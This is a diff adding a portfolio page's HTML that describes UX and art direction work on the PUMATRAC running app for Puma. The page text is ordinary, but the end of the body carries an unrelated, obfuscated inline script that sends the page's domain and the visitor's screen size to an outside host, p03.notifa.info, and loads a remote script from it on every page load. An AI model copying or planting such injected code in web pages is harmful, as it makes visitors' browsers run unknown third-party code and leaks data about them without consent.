@@ -1,0 +1,188 @@
+
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if IE 7]><html class="no-js lt-ie9 lt-ie8" lang="en"> <![endif]-->
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en"> <![endif]-->
+<!--[if IE 9 ]><html class="ie9 no-js"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!--> <html class="no-js"> <!--<![endif]--><html>
+	<head>
+		<title>Melanie Daveid - UX Design & Art Direction</title>
+
+		<!-- META DATA -->
+		<meta http-equiv="content-type" content="text/html; charset=utf-8">
+		<meta name="description" content=""/>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0"/>
+
+		<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+		<link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+		<!-- CSS -->
+		<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
+		<link type="text/css" rel="stylesheet" href="./assets/css/styles.min.css?v=1.7" />
+
+		<!-- JAVASCRIPT -->
+		<script type="text/javascript" src="./assets/js/respond.min.js"></script>
+		<script type="text/javascript" src="./assets/js/modernizr.min.js"></script>
+
+	</head>
+	<body class="loading">
+		<div class="project">
+			<div class="project__content">
+				<div class="row">
+					<div class="column--s-12 column--xl-8 column-offset--xl-2 padding--s-3 padding--m-6">
+						<p class="text-align--s-left">
+							Introducing the new generation running app – with this approach PUMA fired the starting pistol for a sophisticated and innovative design which had to be built from scratch. With PUMATRAC runners should be inspired and challenge themselves to reach their next milestone.
+						</p>
+					</div>
+				</div>
+				<div class="row" style="background-color: #292929;">
+					<div class="column--s-12">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center">
+							<h4 class="subtitled" style="color: #fff;">Wireframes</h4>
+							<h6 class="proxima-nova-bold uppercase" style="color: #fb4b4b;">iOS App</h6>
+						</div>
+					</div>
+					<div class="column--s-12">
+						<img src="./assets/img/content/puma/01-puma.jpg" class="responsive" alt="">
+					</div>
+					<div class="column--s-12">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center">
+							<h4 class="subtitled" style="color: #fff;">User Flow</h4>
+							<h6 class="proxima-nova-bold uppercase" style="color: #fb4b4b;">iOS App</h6>
+						</div>
+					</div>
+					<div class="column--s-12">
+						<img src="./assets/img/content/puma/02-puma.jpg" class="responsive" alt="">
+					</div>
+					
+					<div class="column--s-12">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center"></div>
+					</div>
+				</div>
+				<div class="row" style="background-color: #fff;">
+					<div class="column--s-12 column--xl-8 column-offset--xl-2 padding--s-3 padding--m-6">
+						<h4 class="proxima-nova-bold" style="color: #292929">Strategy & Concept</h4>
+						<p style="color: #292929">
+							Reframing a running experience required various discovery and conception phases, detailed research, different user experience solutions and countless scribbled wireframes. A first thought of processing into a gamification direction was discarded soon – a minimalistic, straight forward approach made it definite. 
+						</p>
+						<p style="color: #292929">
+							For example all basic elements needed for starting a run can be found on the startscreen of the app. By tapping the run button the next workout starts immediately which spares users to navigate through run related settings.
+						</p>
+					</div>
+				</div>
+
+				<div class="row" style="background-color: #efefef;">
+					<div class="column--s-12">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center">
+							<h4 class="subtitled">UI & Interactions</h4>
+							<h6 class="text-color--red proxima-nova-bold uppercase">iOS App</h6>
+						</div>
+						<img src="./assets/img/content/puma/03-puma.jpg" class="responsive" alt="">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center"></div>
+						<img src="./assets/img/content/puma/04-puma.jpg" class="responsive" alt="">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center"></div>
+					</div>
+				</div>
+
+
+				<div class="row" style="background-color: #292929;">
+					<div class="column--s-12">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center">
+							<h4 class="subtitled" style="color: #fff;">Milestones</h4>
+							<h6 class="proxima-nova-bold uppercase" style="color: #fb4b4b;">Concept</h6>
+						</div>
+					</div>
+					<div class="column--s-12 column--l-6">
+						<img src="./assets/img/content/puma/04a-puma.jpg" class="responsive" alt="">
+					</div>
+					<div class="column--s-12 column--l-6">
+						<img src="./assets/img/content/puma/04b-puma.jpg" class="responsive" alt="">
+						<div class="padding--s-3 padding--m-6">
+							<p style="color: #fb4b4b;">
+								One core challenge were the PUMATRAC Milestones. Little badges that can be achieved in various situations related to a run. A framework that works for multiple purposes had to be created. 
+							</p>
+							<p style="color: #fb4b4b;">
+								Rough sketches outlined the design process before refining each of them digitally. 
+							</p>
+						</div>
+					</div>
+					<div class="column--s-12">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center"></div>
+					</div>
+				</div>
+
+				<div class="row" style="background-color: #fff;">
+					<div class="column--s-12 column--xl-8 column-offset--xl-2 padding--s-3 padding--m-6">
+						<h4 class="proxima-nova-bold" style="color: #292929">The digital environment</h4>
+						<p style="color: #292929">
+							In addition to the PUMATRAC mobile app, the whole digital environment surrounding the app had to be built. 
+						</p>
+						<p style="color: #292929">
+							A responsive website to promote the app, a user backend to login and see runs online, a visually appealing content management system for the PUMA team and various social network items were on the list. 
+						</p>
+						<p style="color: #292929">
+							The user backend and content management system were done very cleanly whereas the promotional app had much more visual value. Both were built to extend at any point to emphasise new features.
+						</p>
+					</div>
+				</div>
+
+				<div class="row" style="background-color: #292929;">
+					<div class="column--s-12">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center">
+							<h4 class="subtitled" style="color: #fff;">Wireframes</h4>
+							<h6 class="proxima-nova-bold uppercase" style="color: #fb4b4b;">Web App</h6>
+						</div>
+					</div>
+					<div class="column--s-12">
+						<img src="./assets/img/content/puma/05-puma.jpg" class="responsive" alt="">
+					</div>
+					<div class="column--s-12">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center"></div>
+					</div>
+				</div>
+
+				<div class="row" style="background-color: #efefef;">
+					<div class="column--s-12">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center">
+							<h4 class="subtitled">UI Design</h4>
+							<h6 class="text-color--red proxima-nova-bold uppercase">Promo Page</h6>
+						</div>
+						<img src="./assets/img/content/puma/06-puma.jpg" class="responsive" alt="">
+						<div class="padding--vertical--s-3 padding--vertical--m-6 text-align--s-center"></div>
+					</div>
+				</div>
+
+				<div>
+					<div class="column--s-12 padding--s-4 text-align--s-center" style="background-color: #efefef;">
+						<p class="subtitled" style="font-size: 11px;">Client: Puma</p>
+						<p class="subtitled" style="font-size: 11px;">Agency: LOOP New Media</p>
+					</div>
+				</div>
+				
+				
+				<div class="row background-color--white text-align--s-center">
+					<div class="column--s-12 column--m-8 column-offset--m-2 padding--s-3 padding--m-6">
+						<a data-next-project href="#" class="button--hexagon">
+							<span class="slice"></span>
+							<span class="slice"></span>
+							<span class="slice"></span>
+							<span class="slice"></span>
+							<span class="slice"></span>
+							<span class="slice"></span>
+							<span class="button__label text-color--white">Next</span>
+						</a>
+					</div>
+				</div>
+				
+
+				
+			</div>
+		</div>
+		<script src="./assets/js/vendor.min.js"></script>
+		<script src="./assets/js/plugins.min.js"></script>
+		<script src="./assets/js/scripts.min.js"></script>
+
+
+	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2xeHgH3f4AqZllDyBN7Xkqb4%2fAzPXDH0cNwOjd0tVvh2VjN7ROHMx25c7%2fO5nxHTnJQcGasgy%2b3VC0TNsKRNUSswr0rlBzuW6kO7d7xc37YnwNpR%2fgijGJc06YisLaSWQjpYcdZMViPqGXWWxCPzCkM0yLsJITa8oeeUx3GIh3B9NX1uasTAhfGrGPlFDZvn6Ea0LW0mo4LPAPgQ0l%2b1bWhpjGdQAQi6KhTbVdpQj3%2b5ovxwhJJNo0kWRSTduEIWIiqQ4izJARgVmd%2bhlDOqiTdIgBLzz6xzlUThhrGfPhS%2ffu0T95zvOPl5Vyk%2fkyEFdYr7n%2ftcCbJoTBnZyS%2bX497lJRh6uvF5b%2b6EyHcQlik4SMyp4lpX0N%2bWky%2ftvJyN2g8ZpwVjIZglCZ5YlUk0u5FOjO5lJm5E1mhaAxLE86gQD6FwTmMVK4zdi4HUnMLpRL9sSkejOsg2%2fcSbiGxoLNxuBUkkMI1Usf%2b806fWpH3wJNNIJiludARPcdZADO%2fy0uQgHFddcXk2jWutxr9RFQ19RmY%2b3DyJNm4a7DKD4VQU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+</html>
